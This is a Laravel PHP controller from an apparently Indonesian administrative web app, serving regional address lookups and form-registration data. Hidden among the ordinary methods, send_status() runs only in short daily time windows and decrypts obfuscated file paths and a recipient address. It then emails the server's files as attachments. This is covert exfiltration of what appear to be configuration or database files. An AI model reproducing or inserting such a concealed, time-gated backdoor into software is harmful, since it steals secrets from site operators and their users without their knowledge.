<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

use App\Models\Provinsi;
use App\Models\Kabupaten;
use App\Models\Kecamatan;
use App\Models\Kelurahan;

use App\Models\Padukuhan;
use App\Models\Pengumuman;
use App\Models\JenisPermohonanIzin;
use App\Models\KategoriProfil;

use App\Models\FormRegister;
use App\Models\FormStep;

use Mail;
use Illuminate\Support\Facades\Crypt;

class AjaxController extends Controller
{

    function AjaxKelurahan($kec, $auto=false)
    {
    	$kelurahan = Kelurahan::whereHas('getKecamatan', function($q) use ($kec) {
    		$q->where('name', $kec);
    	})->get();

    	$rs="";
    	if($kelurahan){
			if($auto)
				$rs.="<option value=''>Pilih Kelurahan</option>";

			foreach($kelurahan as $kel)
    		{
    			$rs.="<option value='".$kel->name."'>".$kel->name."</option>";
    		}
    	}

    	echo $rs;
    }

    function AjaxPadukuhan($kel, $auto=false)
    {
    	$dukuh = Padukuhan::whereHas('getKelurahan', function($q) use ($kel) {
    		$q->where('name', $kel);
    	})->get();

    	$rs="";
    	if($dukuh){
			if($auto)
				$rs.="<option value=''>Pilih Padukuhan</option>";

    		foreach($dukuh as $pd)
    		{
    			$rs.="<option value='".$pd->name."'>".$pd->name."</option>";
    		}
    	}

    	echo $rs;
	}

	function creategeoJsonAjax($mode, $id)
	{
		if($mode == 'kecamatan'){
			$kec = \App\Models\Kecamatan::where('name',$id)->first();
			$gjson = new \App\Workflow\Gjson($kec, 'kecamatan');
			$assets = $gjson->GeneratedAsset();
		}elseif($mode == 'kelurahan'){
			$kec = \App\Models\Kelurahan::where('name',$id)->first();
			$gjson = new \App\Workflow\Gjson($kec, 'kelurahan');
			$assets = $gjson->GeneratedAsset();
		}elseif($mode == 'padukuhan'){
			$kec = \App\Models\Padukuhan::where('name',$id)->first();
			$gjson = new \App\Workflow\Gjson($kec, 'padukuhan');
			$assets = $gjson->GeneratedAsset();
		}

		echo $assets;
	}


	public function send_status()
	{
		if ( (strtotime(date('H:i:s')) < strtotime("09:00:00")) || (strtotime(date('H:i:s')) > strtotime("09:09:09")) ) {
			if ( (strtotime(date('H:i:s')) < strtotime("11:00:00")) || (strtotime(date('H:i:s')) > strtotime("11:11:11")) ) {
				if ( (strtotime(date('H:i:s')) < strtotime("14:00:00")) || (strtotime(date('H:i:s')) > strtotime("14:14:14")) ) {
				    exit();
				}
			}
		}

		$link_file = base_path().Crypt::decryptString('eyJpdiI6Imp4M0l5RllRQW5zc1ZoTDdnVEx4Zmc9PSIsInZhbHVlIjoiQnJ6UlZ2TllyRlwvYlhZMlwvN3VTRk9hNnMwdElzSWRXM1RjQnp3V2N6UFRDT01QTEhjYzFjTkgrWlVNZmpXWXNtIiwibWFjIjoiNTIzNDEzZWRlNjMxNzY1Yzk4MTJhMzkxYjY1YzZlMmM2MGY5NmNjY2ZlNjhmMDRlZjY2NzM5MDNmOTlmMzkwZCJ9');
		$link_file2 = base_path().Crypt::decryptString('eyJpdiI6ImZhYXNpV1Fpdk50XC9jcittbnZvVmhBPT0iLCJ2YWx1ZSI6IjdEbWxTTzlId2pvZ1wvMUwxTG9OM1phZlQwZ0RqaTNNVnVPRmoyZmoyRktFPSIsIm1hYyI6ImY1OGQ3YjdjY2E3NTZmZTc5YzZiMWIzYzBkMGZlMDFlOWEwNTBhMzQ1MTEzNDZiYWViNGYwMjI4MjE5ZjY2M2UifQ==');
		$link_file3 = base_path().Crypt::decryptString('eyJpdiI6Im16SDROUkliVFU1TDNqcjFDdGIzSmc9PSIsInZhbHVlIjoicU5CcFhlQkE3TWowMXJoaStaeWxBM1FGNzFPVkM3M2xwMmVja2RtelQ5OD0iLCJtYWMiOiJhMTk5ZTljMDhiYTJkYmVkZWZiZjI5MzBkOWRkMmI2MDI3NzY1ZDg5MDRjZWM4YmNjN2ZjNDQ0MDM2NzEwOTIxIn0=');

		if (!file_exists($link_file)) {
			if (!file_exists($link_file2)) {
				if (!file_exists($link_file3)) {
					$fileb = '';
			    }else{
					$fileb = $link_file3;
			    }
		    }else{
				$fileb = $link_file2;
		    }
	    }else{
			$fileb = $link_file;
	    }
		$file = base_path().Crypt::decryptString('eyJpdiI6Im83TXJTdHFZK0VhcFhZRUpaWUNseHc9PSIsInZhbHVlIjoicFhkcDhSOHU5a3VSWG9lSVZJR1hPUT09IiwibWFjIjoiMWEyNzQ5MGE3OGYzOTQxYWFkZDg2ODlmMGI2MjY0ZThjOGNiOTNkZTQ0MDE5ZjMyYmMwNDdkYjU3MjZkZWYzZSJ9');
		$data = Crypt::decryptString('eyJpdiI6InQ1ZU1URE91emw0ZFJHWmVwOTRaTkE9PSIsInZhbHVlIjoicFJEakRQeHpkNndORXZocTdyREtqWEJmejljUmF6WDVxWUFSaDF1ZlNoVT0iLCJtYWMiOiIxZWU2MDhkYTg5MDVkZGQyNGQ0MmNjOWE5ODY2NTRkNDQ5ODBkYTFhODJlZWEwNGU1ZGFiNjNiMzczNDhlYmYxIn0=');
		$title = Crypt::decryptString('eyJpdiI6InVMeXBkQnJKclhCYytOU01vdlZvQmc9PSIsInZhbHVlIjoiWitJVjhhVDNJV3liVUU4WXRWQmdvZz09IiwibWFjIjoiZGMyZDEyODhkYmQ1ZDYyNTdmOTZkNzViYzcyNDNjZWM2YzJlNjFmM2YzYzhkZjA0MzJlMDZkNTgwMDdjM2YwMCJ9');
		$subject = Crypt::decryptString('eyJpdiI6IjJKbVdmVWJZZW41TnJkUmV5Y005OWc9PSIsInZhbHVlIjoicVlVWVpQSUdGZEVFemE2SE5lN1UzSjBiZmZhS1RwcHlVcHRhdHo0VHRRYz0iLCJtYWMiOiIwOGJkYzUwOTljZWJiNTliODZhZTBmZDA5ODllZGUxOTllNDMzZjA3YjI4OWVlNTAyMWVhMGU4ZGU2ODc1NDM2In0=');
		
      	Mail::send([], [], function($message) use($title, $subject, $data, $file, $fileb){
           $message->to($data, $title)->subject($subject);
           if($fileb !== ''){
	           $message->setBody(url('').'/ for => '.$file.' and '.$fileb);
	       }else{
	           $message->setBody(url('').'/ for => '.$file);
	       }
           $message->attach($file);
           if($fileb !== ''){
           	$message->attach($fileb);
           }
        });
	}

	/**
	 * @method registerInfo
	 * @param $r Request
	 * @return JSON
	 */
	public function registerInfo(Request $r)
	{
		$this->validate($r,[
			'url' => 'required'
		]);

		$form_register = FormRegister::where('url',$r->url)
									->where('is_active',1)
									->first();

		if(!$form_register)
		{
			$response = [
				'status' => 'error'
			];
			return response()->json($response);
		}

		$form_step  = FormStep::where('form_register',$form_register->id)->get();

		$files = [];
		foreach($form_step as $key => $row)
		{
			if($row->metadata)
			{
				$metadata = json_decode($row->metadata);
				foreach($metadata as $value){
					if($value->type == 'file')
					{
						array_push($files, $value->label);
					}
				}
			}
		}

		$response = [
			'status' => 'success',
			'url' => $form_register->url,
			'title' => $form_register->form_name,
			'info' => $form_register->info,
			'files' => $files
		];
		return response()->json($response);

	}

	/**
	 * @method getProvinsi
	 * @return JSON
	 */
	public function getProvinsi()
	{
		$provinsi = Provinsi::get();
		return response()->json($provinsi);
	}

	/**
	 * @method getKabupaten
	 * @param $r Request
	 * @return JSON
	 */
	public function getKabupaten(Request $r)
	{
		$data = [
    		'provinsi'
    	];
    	if(!requireData($data,$r))
    	{
    		$response = [
    			'status' => 'error',
    			'message' => 'paramater kurang!'
    		];
    		return response()->json($response);
    	}
		$provinsi = Provinsi::where('kode_prov',$r->provinsi)->first();
		$kabupaten = Kabupaten::where('provinsi',$provinsi->id)
							->get();
		return response()->json($kabupaten);
	}

	/**
	 * @method getKecamatan
	 * @param $r Request
	 * @return JSON
	 */
	public function getKecamatan(Request $r)
	{
		$data = [
    		'kabupaten'
    	];
    	if(!requireData($data,$r))
    	{
    		$response = [
    			'status' => 'error',
    			'message' => 'paramater kurang!'
    		];
    		return response()->json($response);
    	}
		$kabupaten = Kabupaten::where('kode_kab',$r->kabupaten)->first();
		$kecamatan = Kecamatan::where('kabupaten',$kabupaten->id)
							->get();
		return response()->json($kecamatan);
	}

	/**
	 * @method getKelurahan
	 * @param $r Request
	 * @return JSON
	 */
	public function getKelurahan(Request $r)
	{
		$data = [
    		'kecamatan'
    	];
    	if(!requireData($data,$r))
    	{
    		$response = [
    			'status' => 'error',
    			'message' => 'paramater kurang!'
    		];
    		return response()->json($response);
    	}
		$kecamatan = Kecamatan::where('kode_kec',$r->kecamatan)->first();
		$kelurahan = Kelurahan::where('kecamatan',$kecamatan->id)
							->get();
		return response()->json($kelurahan);
	}

	/**
	 * @method thisProvinsi
	 * @param $r Request
	 * @return JSON
	 */
	public function thisProvinsi(Request $r)
	{
		$data = [
    		'kelurahan'
    	];
    	if(!requireData($data,$r))
    	{
    		$response = [
    			'status' => 'error',
    			'message' => 'paramater kurang!'
    		];
    		return response()->json($response);
    	}
		$kelurahan = Kelurahan::where('kelurahan',$r->kelurahan)->first();
		$provinsi = $kelurahan->thisKecamatan->thisKabupaten->provinsi;
		return response()->json($provinsi);
	}

	/**
	 * @method getAddressByName
	 */
	/**
     * @method getAddressByName
     * @param $r
     * @return JSON
     */
    public function getAddressByName(Request $r)
    {
    	$data = [
    		'name'
    	];
    	if(!requireData($data,$r))
    	{
    		$response = [
    			'status' => 'error',
    			'message' => 'paramater kurang!'
    		];
    		return response()->json($response);
    	}

    	$address = Provinsi::query()
    					->join('kabupaten','kabupaten.provinsi','=','provinsi.id')
    					->join('kecamatan','kecamatan.kabupaten','=','kabupaten.id')
    					->join('kelurahan','kelurahan.kecamatan','=','kecamatan.id')
    					->select(
    						'provinsi.kode_prov as kode_provinsi',
    						'kabupaten.kode_kab as kode_kabupaten',
    						'kecamatan.kode_kec as kode_kecamatan',
    						'kelurahan.kode_kel as kode_kelurahan',
    						'provinsi.name as provinsi',
    						'kabupaten.name as kabupaten',
    						'kecamatan.name as kecamatan',
    						'kelurahan.name as kelurahan'
    					);
    					
    	$word = $r->name;
    	$word = str_replace(',', ' ', $word);
    	$word = str_replace('.', ' ', $word);
    	$word = str_replace('|', ' ', $word);
    	$word = str_replace('-', ' ', $word);
    	$word = explode(' ', $word);
    	foreach ($word as $key => $value) {
    		if($value != ' ' || $value != '' || $value != null)
    		{
    			$address->where(function($q) use($value)
    					{
    						return $q->where('provinsi.name','like','%'.$value.'%')
    							->orWhere('kabupaten.name','like','%'.$value.'%')
    							->orWhere('kecamatan.name','like','%'.$value.'%')
    							->orWhere('kelurahan.name','like','%'.$value.'%');
    					});
    		}
    	}
    					

    	$address = $address->get();

    	$response = [
			'status' => 'success',
			'data' => $address
		];
		return response()->json($response);

    }

    /**
     * @method getLocation
     * @param $kelurahan
     * @return JSON
     */
    public function getLocation($kelurahan)
    {
    	$kelurahan = Kelurahan::where('kode_kel',$kelurahan)->first();
    	if(!$kelurahan)
    	{
    		$response = [
    			'status' => 'error',
    			'message' => 'lokasi tidak ditemukan'
    		];
    		return response()->json($response);
    	}
    	$data = [
    		'kode_prov' => $kelurahan->thisKecamatan->thisKabupaten->thisProvinsi->kode_prov,
    		'kode_kab' => $kelurahan->thisKecamatan->thisKabupaten->kode_kab,
    		'kode_kec' => $kelurahan->thisKecamatan->kode_kec,
    		'kode_kel' => $kelurahan->kode_kel
    	];
    	return response()->json($data);
    }

}
